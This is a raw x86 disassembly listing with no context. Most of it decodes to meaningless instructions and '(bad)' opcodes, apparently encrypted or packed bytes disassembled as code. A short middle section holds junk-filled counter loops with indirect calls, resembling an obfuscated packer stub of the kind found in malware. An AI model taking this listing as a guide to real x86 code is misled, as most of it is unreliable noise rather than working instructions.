  40a997:	or     BYTE PTR [ecx-0x624fce9],cl
  40a99d:	aad    0xee
  40a99f:	mov    bh,0x4e
  40a9a1:	fcom   DWORD PTR ds:0xbb372dc0
  40a9a7:	inc    ecx
  40a9a8:	loope  0x40a966
  40a9aa:	(bad)  
  40a9ab:	mov    WORD PTR [esp+edi*8],?
  40a9ae:	ds xchg esi,eax
  40a9b0:	adc    eax,0x35461a67
  40a9b5:	aas    
  40a9b6:	fcom   QWORD PTR [esi-0x407fa5c1]
  40a9bc:	popa   
  40a9bd:	add    bh,BYTE PTR [ebx]
  40a9bf:	fsubp  st(3),st
  40a9c1:	sub    eax,0x31eb5920
  40a9c6:	stos   DWORD PTR es:[edi],eax
  40a9c7:	into   
  40a9c8:	std    
  40a9c9:	xchg   DWORD PTR [edx-0x3e4e9e23],eax
  40a9cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9d0:	mov    bh,0x3c
  40a9d2:	pop    es
  40a9d3:	dec    esp
  40a9d4:	mov    edx,0xe7d0e857
  40a9d9:	push   ebx
  40a9da:	jne    0x40aa39
  40a9dc:	inc    esp
  40a9dd:	les    eax,FWORD PTR [ebp+0x6d]
  40a9e0:	aaa    
  40a9e1:	xchg   ecx,eax
  40a9e2:	addr16 in eax,0xba
  40a9e5:	jmp    0x9296:0x55624154
  40a9ec:	push   ecx
  40a9ed:	sbb    al,bh
  40a9ef:	xchg   ebx,eax
  40a9f0:	ret    
  40a9f1:	jmp    0x40a9be
  40a9f3:	mov    edx,0xb7c7c60e
  40a9f8:	stos   DWORD PTR es:[edi],eax
  40a9f9:	add    DWORD PTR [eax+ebx*1-0x7],ebx
  40a9fd:	xor    DWORD PTR [ebp+0x37],esi
  40aa00:	sub    al,cl
  40aa02:	and    DWORD PTR [esi],ebp
  40aa04:	jae    0x40aa2f
  40aa06:	imul   ebx,DWORD PTR [ebx],0xffffff95
  40aa09:	punpcklwd mm7,mm4
  40aa0c:	aas    
  40aa0d:	jl     0x40a998
  40aa0f:	pop    ebp
  40aa10:	jno    0x40a9cf
  40aa12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa14:	push   ebp
  40aa15:	cmp    bh,cl
  40aa17:	mov    esp,0x116f2ab6
  40aa1c:	mov    esp,0x54d58984
  40aa21:	sahf   
  40aa22:	test   BYTE PTR [edx+0x65],cl
  40aa25:	jl     0x40a9c8
  40aa27:	ins    BYTE PTR es:[edi],dx
  40aa28:	xchg   edx,eax
  40aa29:	cmp    bh,al
  40aa2b:	or     cl,BYTE PTR [ebx+0x7510d062]
  40aa31:	add    eax,0xba0cc002
  40aa36:	outs   dx,BYTE PTR ds:[esi]
  40aa37:	popf   
  40aa38:	mov    BYTE PTR [edi+0x57],cl
  40aa3b:	adc    ecx,DWORD PTR [ebx+0x10738cc4]
  40aa41:	xchg   edi,eax
  40aa42:	nop
  40aa43:	stc    
  40aa44:	adc    DWORD PTR [ebx+eax*4],ebp
  40aa47:	cmp    eax,0xfdf7ebcc
  40aa4c:	xchg   edx,eax
  40aa4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa4e:	daa    
  40aa4f:	ror    DWORD PTR [esi],cl
  40aa51:	push   edx
  40aa52:	stc    
  40aa53:	jmp    0x4a10cc01
  40aa58:	mov    ch,BYTE PTR [esi-0x692af070]
  40aa5e:	sub    esi,ecx
  40aa60:	lods   al,BYTE PTR ds:[esi]
  40aa61:	inc    edi
  40aa62:	jb     0x40aa3b
  40aa64:	lods   al,BYTE PTR ds:[esi]
  40aa65:	jle    0x40aa44
  40aa67:	add    DWORD PTR [eax-0x23f8e6a2],esp
  40aa6d:	aaa    
  40aa6e:	iret   
  40aa6f:	stos   DWORD PTR es:[edi],eax
  40aa70:	or     ebx,DWORD PTR [ecx]
  40aa72:	push   edx
  40aa73:	inc    eax
  40aa74:	mov    es,WORD PTR [eax-0x424a3a73]
  40aa7a:	mov    WORD PTR [eax+0xb],ds
  40aa7d:	outs   dx,BYTE PTR ds:[esi]
  40aa7e:	fwait
  40aa7f:	enter  0xbe3b,0xee
  40aa83:	and    eax,0x44e42485
  40aa88:	xor    al,0xc7
  40aa8a:	jg     0x40aa66
  40aa8c:	adc    eax,0x817d10ac
  40aa91:	jns    0x40aa67
  40aa93:	xchg   ah,bl
  40aa95:	jb     0x40aa6b
  40aa97:	jno    0x40aab8
  40aa99:	cmp    BYTE PTR [ebx+0x6684fb63],al
  40aa9f:	jge    0x40aaa5
  40aaa1:	xchg   BYTE PTR [eax],ah
  40aaa3:	add    eax,0xbacff2fc
  40aaa8:	into   
  40aaa9:	rcl    BYTE PTR [edi],0x25
  40aaac:	sbb    DWORD PTR [edx+ecx*1+0x10b88c3],edx
  40aab3:	int3   
  40aab4:	or     esp,DWORD PTR [ebx+0xe37e09a]
  40aaba:	retf   
  40aabb:	outs   dx,DWORD PTR ds:[esi]
  40aabc:	out    0x99,eax
  40aabe:	and    dl,BYTE PTR [ebp+esi*8+0x5fd893de]
  40aac5:	ins    BYTE PTR es:[edi],dx
  40aac6:	aas    
  40aac7:	pop    esp
  40aac8:	mov    eax,ds:0x8e0b3d83
  40aacd:	fs dec ecx
  40aacf:	pop    eax
  40aad0:	inc    ebp
  40aad1:	ret    0xfe07
  40aad4:	bnd js 0x40ab3a
  40aad7:	loope  0x40aa91
  40aad9:	mov    esp,DWORD PTR [ebp+0x47]
  40aadc:	aas    
  40aadd:	xor    ebx,edx
  40aadf:	xlat   BYTE PTR ds:[ebx]
  40aae0:	in     eax,dx
  40aae1:	adc    eax,0x8f5e771f
  40aae6:	retf   0x52e
  40aae9:	fisubr WORD PTR [edi]
  40aaeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaec:	imul   edx,ebx,0x40332197
  40aaf2:	pop    eax
  40aaf3:	xchg   edi,eax
  40aaf4:	and    DWORD PTR [ebp-0x785f927],ebx
  40aafa:	jb     0x40aa7e
  40aafc:	(bad)  
  40aafd:	cmp    DWORD PTR [esi-0x31],ebp
  40ab00:	inc    esp
  40ab01:	mov    al,ds:0x859936e1
  40ab06:	mov    ds:0xb9ec88b9,al
  40ab0b:	retf   0x8acd
  40ab0e:	xchg   ebx,eax
  40ab0f:	mov    edi,0x9b241fd7
  40ab14:	dec    ecx
  40ab15:	lahf   
  40ab16:	push   0x58
  40ab18:	mov    dh,0x3a
  40ab1a:	popa   
  40ab1b:	scas   eax,DWORD PTR es:[edi]
  40ab1c:	and    BYTE PTR [esi-0x6c2f18e8],0x85
  40ab23:	frstorw [ecx-0x6a]
  40ab27:	cmp    dh,BYTE PTR fs:[edx]
  40ab2a:	neg    BYTE PTR [ecx-0x78]
  40ab2d:	inc    edi
  40ab2e:	jmp    0xbb859d37
  40ab33:	lods   al,BYTE PTR ds:[esi]
  40ab34:	push   cs
  40ab35:	pop    es
  40ab36:	rcr    al,1
  40ab38:	mov    esp,0xf95ac352
  40ab3d:	or     ebx,ecx
  40ab3f:	jns    0x40ab96
  40ab41:	lods   al,BYTE PTR ds:[esi]
  40ab42:	jnp    0x40ab2d
  40ab44:	sub    eax,0x8c7e02f5
  40ab49:	dec    edx
  40ab4a:	mov    eax,0xbd8d2018
  40ab4f:	sub    eax,0xc5f0d08f
  40ab54:	push   es
  40ab55:	sub    eax,0xfb0ae6ef
  40ab5a:	dec    ebx
  40ab5b:	mov    ecx,0x356d42b0
  40ab60:	scas   al,BYTE PTR es:[edi]
  40ab61:	mov    bl,0xae
  40ab63:	and    ah,BYTE PTR [edx]
  40ab65:	sbb    DWORD PTR [ebp-0x47],esp
  40ab68:	lea    esp,[ecx]
  40ab6a:	xchg   ecx,eax
  40ab6b:	fmulp  st(0),st
  40ab6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab6e:	jmp    0xd21cdfb0
  40ab73:	and    BYTE PTR [esi+0x4b],0xe4
  40ab77:	out    0xf8,eax
  40ab79:	ret    
  40ab7a:	inc    edx
  40ab7b:	clc    
  40ab7c:	loopne 0x40abd7
  40ab7e:	cmc    
  40ab7f:	retf   0x414b
  40ab82:	push   ebp
  40ab83:	neg    BYTE PTR [eax-0x11]
  40ab86:	jg     0x40ab9a
  40ab88:	fdiv   DWORD PTR [ebx+0x78]
  40ab8b:	push   ebp
  40ab8c:	fstp   DWORD PTR [ecx]
  40ab8e:	stc    
  40ab8f:	adc    al,0x72
  40ab91:	into   
  40ab92:	fwait
  40ab93:	jns    0x40ab91
  40ab95:	das    
  40ab96:	jle    0x40ab80
  40ab98:	imul   ebp,DWORD PTR [ebx],0xa
  40ab9b:	sahf   
  40ab9c:	mov    cl,0xcc
  40ab9e:	mov    ah,0x7a
  40aba0:	push   0x49dfd3e3
  40aba5:	mov    al,ds:0x20dd4d2b
  40abaa:	sub    eax,0xb0253de
  40abaf:	test   BYTE PTR [eiz*2+0x3f407406],bh
  40abb6:	(bad)  
  40abb8:	pop    eax
  40abb9:	ds scas eax,DWORD PTR es:[edi]
  40abbb:	out    dx,al
  40abbc:	push   esp
  40abbd:	jns    0x40ac18
  40abbf:	mov    edi,0x3d854717
  40abc4:	sub    ebp,ebp
  40abc6:	jle    0xdd6f17f8
  40abcc:	(bad)  
  40abcd:	cmp    eax,DWORD PTR [ecx+edi*1-0x52]
  40abd1:	xor    al,dl
  40abd3:	(bad)  
  40abd4:	and    BYTE PTR [eax+0x6f6bb76f],dl
  40abda:	and    al,0x50
  40abdc:	shl    BYTE PTR [esi+ebp*8+0x39],0x77
  40abe1:	add    esi,ebx
  40abe3:	cmp    edx,DWORD PTR [eax+0x79]
  40abe6:	jle    0x40ab8c
  40abe8:	mov    eax,0xf17ba189
  40abed:	push   ebx
  40abee:	sti    
  40abef:	scas   eax,DWORD PTR es:[edi]
  40abf0:	shl    esi,1
  40abf2:	in     al,0x73
  40abf4:	add    eax,0x3fe4d2a8
  40abf9:	xchg   BYTE PTR [edx+0x5f],dh
  40abfc:	fadd   st,st(7)
  40abfe:	or     edi,DWORD PTR [ecx+0x3581d033]
  40ac04:	cmc    
  40ac05:	std    
  40ac06:	inc    edx
  40ac07:	add    BYTE PTR [edi],cl
  40ac09:	call   0xd143ac50
  40ac0e:	mov    DWORD PTR ds:0x42e803,0x189b
  40ac18:	cmp    edi,edx
  40ac1a:	mov    DWORD PTR ds:0x42fddd,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fe7e,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fdf5,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e7f7,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e7f7,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e7f7,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e33d
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e3f3
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e7f7
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e7f7,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e228,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e228
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e228,ebx
  40acad:	cmp    DWORD PTR ds:0x42e228,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e228,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e3f7
  40acd5:	cmp    DWORD PTR ds:0x42e228,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e228
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e228,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e234
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fde1,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fde1,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fde1,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fe01
  40ad3c:	call   DWORD PTR ds:0x42e64b
  40ad42:	mov    ebx,DWORD PTR ds:0x42fde1
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fde1,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40ad81
  40adb4:	pop    esp
  40adb5:	into   
  40adb6:	xchg   ecx,eax
  40adb7:	add    edi,ebp
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40ae35
  40adc0:	ja     0x40adfc
  40adc2:	inc    ebx
  40adc3:	cs enter 0x4ae5,0x18
  40adc8:	enter  0x90d6,0x20
  40adcc:	popa   
  40adcd:	xchg   ebx,eax
  40adce:	add    al,0x61
  40add0:	jmp    0xe38a0b88
  40add5:	ja     0x40ae3f
  40add7:	int3   
  40add8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40add9:	mov    eax,ds:0xc36fd509
  40adde:	clc    
  40addf:	js     0x40ad99
  40ade1:	(bad)  
  40ade2:	mov    esp,0x4ab5a842
  40ade7:	and    al,0x80
  40ade9:	dec    ebx
  40adea:	jmp    0x40ae57
  40adec:	mov    WORD PTR [di+0x31f8],es
  40adf1:	cmp    esp,DWORD PTR [ebx]
  40adf3:	retf   0xcc60
  40adf6:	jecxz  0x40ad7c
  40adf8:	jp     0x40ae03
  40adfa:	icebp  
  40adfb:	mov    ebx,0xb7bf1b99
  40ae00:	or     DWORD PTR ds:0x5834583a,ecx
  40ae06:	mov    ah,0xc6
  40ae08:	fild   QWORD PTR [ecx-0x15]
  40ae0b:	dec    ebx
  40ae0c:	mov    DWORD PTR [edx-0x43],eax
  40ae0f:	jl     0x40adbf
  40ae11:	dec    ecx
  40ae12:	es inc ebp
  40ae14:	dec    ebx
  40ae15:	jmp    0x40adb8
  40ae17:	fidiv  WORD PTR [ecx-0x5f39d9b5]
  40ae1d:	shl    DWORD PTR [ecx+0x9431b1e],0x43
  40ae24:	dec    ebp
  40ae25:	mov    ah,0xcb
  40ae27:	stos   BYTE PTR es:[edi],al
  40ae28:	push   0xadc7294f
  40ae2d:	pop    ds
  40ae2e:	mov    cl,0x62
  40ae30:	or     al,dl
  40ae32:	stos   BYTE PTR es:[edi],al
  40ae33:	sbb    esi,DWORD PTR [edx-0x28979795]
  40ae39:	push   ds
  40ae3a:	pop    edx
  40ae3b:	popf   
  40ae3c:	or     cl,dl
  40ae3e:	xor    BYTE PTR [esi-0x1c],ch
  40ae41:	(bad)  [ebp+0x3d819bb4]
  40ae47:	xchg   edx,eax
  40ae48:	jecxz  0x40ae06
  40ae4a:	arpl   WORD PTR [ecx-0x6d],bx
  40ae4d:	(bad)  
  40ae4f:	inc    ebp
  40ae50:	test   al,bh
  40ae52:	ins    DWORD PTR es:[edi],dx
  40ae53:	enter  0x1339,0xb1
  40ae57:	rcr    DWORD PTR [ecx],0x57
  40ae5a:	fdiv   st,st(7)
  40ae5c:	mov    al,0xab
  40ae5e:	or     ah,BYTE PTR [edi+eiz*2-0x21256177]
  40ae65:	jl     0x40ae06
  40ae67:	jns    0x40ae05
  40ae69:	(bad)  [ebp+0x2789bd0f]
  40ae6f:	clc    
  40ae70:	mov    eax,0x31f67341
  40ae75:	cmc    
  40ae76:	leave  
  40ae77:	cli    
  40ae78:	jmp    0x7d4fd420
  40ae7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae7e:	fdivr  QWORD PTR ds:0x23436549
  40ae84:	ret    
  40ae85:	push   edx
  40ae86:	jno    0x40af05
  40ae88:	scas   eax,DWORD PTR es:[edi]
  40ae89:	test   al,ch
  40ae8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae8c:	inc    edi
  40ae8d:	in     al,dx
  40ae8e:	sub    ecx,ebp
  40ae90:	ret    0x27a3
  40ae93:	lea    ecx,[ebx+ebx*4]
  40ae96:	dec    esi
  40ae97:	aad    0x31
  40ae99:	aaa    
  40ae9a:	push   ecx
  40ae9b:	jmp    0xf0efa1b0
  40aea0:	push   cs
  40aea1:	int3   
  40aea2:	cmp    al,0x62
  40aea4:	nop
  40aea5:	push   0x8f629d99
  40aeaa:	xchg   BYTE PTR [esi+0x0],dl
  40aead:	add    al,BYTE PTR [edx-0x3d4674e]
  40aeb3:	jno    0x40aecf
  40aeb5:	loopne 0x40ae6b
  40aeb7:	adc    ecx,DWORD PTR [ecx]
  40aeb9:	cmp    al,0x7d
  40aebb:	int3   
  40aebc:	inc    ebp
  40aebd:	push   0x69
  40aebf:	aaa    
  40aec0:	hlt    
  40aec1:	mov    edx,0x122df0ed
  40aec6:	clc    
  40aec7:	dec    esp
  40aec8:	dec    eax
  40aec9:	xchg   esp,eax
  40aeca:	jl     0x40aec0
  40aecc:	push   ss
  40aecd:	(bad)
  40aed0:	pop    ebx
  40aed1:	cwde   
  40aed2:	jecxz  0x40af28
  40aed4:	sbb    al,BYTE PTR [eax-0x4d713c47]
  40aeda:	or     DWORD PTR [ecx-0x172cd5aa],ecx
  40aee0:	cmp    al,0x5
  40aee2:	cs pop ebx
  40aee4:	and    eax,0xb7926508
  40aee9:	nop
  40aeea:	test   DWORD PTR [edi-0x35c8aa41],ebx
  40aef0:	add    BYTE PTR [ebp-0x687e349],cl
  40aef6:	cmp    BYTE PTR [edx-0x23e40486],dh
  40aefc:	xchg   edi,eax
  40aefd:	or     bh,BYTE PTR gs:[ebp-0x3df9b282]
  40af04:	xor    eax,0xf6c88106
  40af09:	xor    al,0x5
  40af0b:	lock sti 
  40af0d:	mov    edi,0x80886afd
  40af12:	or     DWORD PTR [edx+ecx*4+0x3061b186],0xffffff89
  40af1a:	sbb    edx,DWORD PTR [ebp+0x23]
  40af1d:	aas    
  40af1e:	enter  0xb747,0x3a
  40af22:	and    DWORD PTR [ecx+0x73be4f17],ebp
  40af28:	lahf   
  40af29:	add    eax,0x3b9b6692
  40af2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af2f:	ja     0x40af95
  40af31:	std    
  40af32:	sub    BYTE PTR [esp+ebx*2-0x26],0x9e
  40af37:	mov    WORD PTR [ebp+0x17],ss
  40af3a:	loope  0x40af2a
  40af3c:	jg     0x40aeeb
  40af3e:	retf   0x8b60
  40af41:	mov    esi,0x4d8890d2
  40af46:	dec    ebp
  40af47:	inc    ebp
  40af48:	stc    
  40af49:	(bad)  
  40af4a:	mov    edx,0xd051428c
  40af4f:	mov    ds:0xa7d6058e,al
  40af54:	xor    eax,0x2cf091ee
  40af59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af5a:	addr16 dec esi
  40af5c:	cld    
  40af5d:	cwde   
  40af5e:	outs   dx,DWORD PTR ds:[esi]
  40af5f:	imul   edx,DWORD PTR ds:0x547247d8,0xd1d83c41
  40af69:	arpl   WORD PTR [ebx-0x5a24f7],bp
  40af6f:	stos   DWORD PTR es:[edi],eax
  40af70:	cld    
  40af71:	js     0x40af11
  40af73:	ins    BYTE PTR es:[edi],dx
  40af74:	and    eax,0x28d5d8d8
  40af79:	into   
  40af7a:	push   edx
  40af7b:	sti    
  40af7c:	pop    esi
  40af7d:	mov    ebp,DWORD PTR [esi]
  40af7f:	das    
  40af80:	jmp    0xd064:0x71a3b180
  40af87:	bound  ebx,QWORD PTR [edx-0x3f]
  40af8a:	sbb    DWORD PTR [eax],esi
  40af8c:	ficom  DWORD PTR [edx-0x68]
  40af8f:	out    0xee,al
  40af91:	cmp    ch,BYTE PTR ds:0x59d025c3
  40af97:	cld    
  40af98:	pop    edx
  40af99:	xchg   esp,eax
  40af9a:	jmp    0x40afb1
  40af9c:	and    eax,0x64681896
  40afa1:	into   
  40afa2:	fidivr WORD PTR [ecx]
  40afa4:	out    0x74,al
  40afa6:	or     al,0x40
  40afa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afa9:	mov    al,ds:0xb8f02805
  40afae:	adc    dh,BYTE PTR [ebx-0xbc51a59]
  40afb4:	mov    ds:0x9a7c8135,eax
  40afb9:	out    0x21,al
  40afbb:	dec    esp
  40afbc:	sbb    cl,BYTE PTR [eax+ecx*1+0xa149587]
  40afc3:	cdq    
  40afc4:	add    DWORD PTR [ecx+0x33],ebx
  40afc7:	or     BYTE PTR [eax-0x73ba0ce7],al
  40afcd:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afcf:	in     eax,dx
  40afd0:	inc    edi
  40afd1:	push   ds
  40afd2:	inc    edx
  40afd3:	into   
  40afd4:	dec    edi
  40afd5:	retf   0x43b6
  40afd8:	stos   BYTE PTR es:[edi],al
  40afd9:	mov    ecx,0xc88a0197
  40afde:	push   ecx
  40afdf:	mov    BYTE PTR [esi-0x579fe40e],ch
  40afe5:	lock arpl WORD PTR [esi],dx
  40afe8:	xchg   ebx,eax
  40afe9:	adc    esi,DWORD PTR [ecx]
  40afeb:	push   ebp
  40afec:	xchg   esp,eax
  40afed:	daa    
  40afee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afef:	pop    edi
  40aff0:	std    
  40aff1:	in     eax,dx
  40aff2:	scas   eax,DWORD PTR es:[edi]
  40aff3:	das    
  40aff4:	inc    ebp
  40aff5:	fld    QWORD PTR [ecx]
  40aff7:	inc    edi
  40aff8:	(bad)  
  40aff9:	mov    ecx,0x597d0fc7
  40affe:	out    0x16,al
  40b000:	mov    BYTE PTR [ecx-0xa],cl
  40b003:	clc    
  40b004:	mov    dl,0x88
  40b006:	add    al,BYTE PTR [eax-0x4f]
  40b009:	scas   eax,DWORD PTR es:[edi]
  40b00a:	pusha  
  40b00b:	mov    bl,0x4d
  40b00d:	inc    ebx
  40b00e:	push   ebp
  40b00f:	shl    BYTE PTR [edx+0x4e],0x6d
  40b013:	jbe    0x40afd3
  40b015:	sub    eax,0x109e9fc3
  40b01a:	sub    edi,eax
  40b01c:	clc    
  40b01d:	fidivr WORD PTR [esi-0x3db2246f]
  40b023:	test   BYTE PTR [edx],ah
  40b025:	mov    bh,0xd2
  40b027:	repz dec ecx
  40b029:	push   eax
  40b02a:	ret    
  40b02b:	push   ss
  40b02c:	fnsave [edi-0x5f]
  40b02f:	daa    
  40b030:	lds    eax,FWORD PTR [eax-0x28]
  40b033:	mov    bh,0xec
  40b035:	sub    al,0x93
  40b037:	sub    esp,DWORD PTR [edx*4-0x19564ce1]
  40b03e:	cdq    
  40b03f:	pop    ecx
  40b040:	xchg   edi,eax
  40b041:	mov    BYTE PTR [edx],dh
  40b043:	pushf  
  40b044:	retf   0xb63
  40b047:	and    eax,0x9a956f0
  40b04c:	jge    0x40afd7
  40b04e:	inc    edi
  40b04f:	pop    es
  40b050:	sar    BYTE PTR [edi+0x741ca0f2],cl
  40b056:	xchg   edi,eax
  40b057:	out    0x2,al
  40b059:	es into 
  40b05b:	out    dx,al
  40b05c:	data16 stos BYTE PTR es:[edi],al
  40b05e:	xchg   DWORD PTR [edi+0xf813b96],ebx
  40b064:	pop    ebp
  40b065:	xchg   ecx,eax
  40b066:	pop    ecx
  40b067:	adc    ecx,DWORD PTR [ebp+0x70ee3fdd]
  40b06d:	inc    edi
  40b06e:	in     eax,0x3d
  40b070:	pop    ecx
  40b071:	mov    dh,0xa3
  40b073:	xchg   ecx,eax
  40b074:	cmp    DWORD PTR [eax-0x49],esp
  40b077:	es jns 0x40b084
  40b07a:	arpl   WORD PTR [edx],sp
  40b07c:	dec    esi
  40b07d:	xchg   BYTE PTR [edx-0x34099b1c],ch
  40b083:	and    eax,0x63a60b14
  40b088:	and    eax,DWORD PTR ds:0x169fa621
  40b08e:	push   ds
  40b08f:	cmp    al,0xe8
  40b091:	test   eax,0x78854279
  40b096:	sub    bl,cl
  40b098:	push   0x59feef98
  40b09d:	fld    QWORD PTR ds:0xb17d742e
  40b0a3:	lds    edx,FWORD PTR [eax-0x19]
  40b0a6:	in     al,0x17
  40b0a8:	xchg   ecx,eax
  40b0a9:	xchg   ebp,eax
  40b0aa:	mov    ch,dl
  40b0ac:	(bad)  
  40b0ad:	fild   DWORD PTR [eax]
  40b0af:	int3   
  40b0b0:	jne    0x40b12c
  40b0b2:	xchg   esp,eax
  40b0b3:	push   ebp
  40b0b4:	pop    ss
  40b0b5:	cmp    al,0xad
  40b0b7:	popf   
  40b0b8:	sub    al,0xb
  40b0ba:	mov    ch,0xc0
  40b0bc:	test   DWORD PTR ds:0x4d323163,eax
  40b0c2:	ds sar dh,cl
  40b0c5:	adc    eax,DWORD PTR [ecx-0x2140f020]
  40b0cb:	daa    
  40b0cc:	xor    al,0x6b
  40b0ce:	dec    edx
  40b0cf:	js     0x40b0ae
  40b0d1:	je     0x40b06f
  40b0d3:	je     0x40b13b
  40b0d5:	cmc    
  40b0d6:	stos   BYTE PTR es:[edi],al
  40b0d7:	arpl   WORD PTR [ebx],cx
  40b0d9:	add    dl,BYTE PTR [edx-0x71bf971e]
  40b0df:	fldenv [esi+0x70dd25bc]
  40b0e5:	imul   edi,DWORD PTR [edi],0x2b
  40b0e8:	not    BYTE PTR [ebp-0x691a7196]
  40b0ee:	outs   dx,DWORD PTR ds:[esi]
  40b0ef:	rol    DWORD PTR [esp+eiz*4+0x40433a15],0x59
  40b0f7:	and    ebp,edx
  40b0f9:	es (bad) 
  40b0fb:	xchg   esp,eax
  40b0fc:	mov    ebp,0x458315ed
  40b101:	psrld  mm7,QWORD PTR [edx]
  40b104:	sbb    eax,0x8da4864a
  40b109:	mov    eax,ds:0x5d609caf
  40b10e:	dec    esp
  40b10f:	sbb    eax,0xde66e7ab
  40b114:	cmp    DWORD PTR [ecx+0x6f],esp
  40b117:	push   ds
  40b118:	inc    edx
  40b119:	pop    esi
  40b11a:	cmp    DWORD PTR [esi],ebp
  40b11c:	adc    al,0xc8
  40b11e:	jo     0x40b161
  40b120:	shl    DWORD PTR es:[eax+0x1aa0a3df],1
  40b127:	add    al,0x11
  40b129:	cmp    DWORD PTR [eax+0x28],esi
  40b12c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b12d:	adc    DWORD PTR [eax-0x54],ebx
  40b130:	popf   
  40b131:	stc    
  40b132:	and    eax,0x7dbd568b
  40b137:	adc    bh,BYTE PTR [ebx-0x50]
  40b13a:	cs mov al,0x1d
  40b13d:	js     0x40b171
  40b13f:	jge    0x40b15c
  40b141:	scas   eax,DWORD PTR es:[edi]
  40b142:	mov    dl,0x17
  40b144:	push   ecx
  40b145:	sahf   
  40b146:	or     BYTE PTR [ebp+0x1f],dl
  40b149:	add    BYTE PTR [esi+0x7cd1f463],ch
  40b14f:	jl     0x40b152
  40b151:	adc    al,0x1
  40b153:	(bad)  
  40b154:	test   DWORD PTR [edi-0x3c],0x18d3606d
  40b15b:	loopne 0x40b165
  40b15d:	popf   
  40b15e:	and    dl,bl
  40b160:	add    edx,ecx
  40b162:	jmp    0x40b520
  40b167:	shl    BYTE PTR [ebp+0x37],cl
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	(bad)  
  40b174:	mov    cl,0x7a
  40b176:	fldenv [edx-0x608f8f06]
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b12f
  40b180:	xchg   edx,eax
  40b181:	cdq    
  40b182:	popf   
  40b183:	mov    BYTE PTR [edi],bl
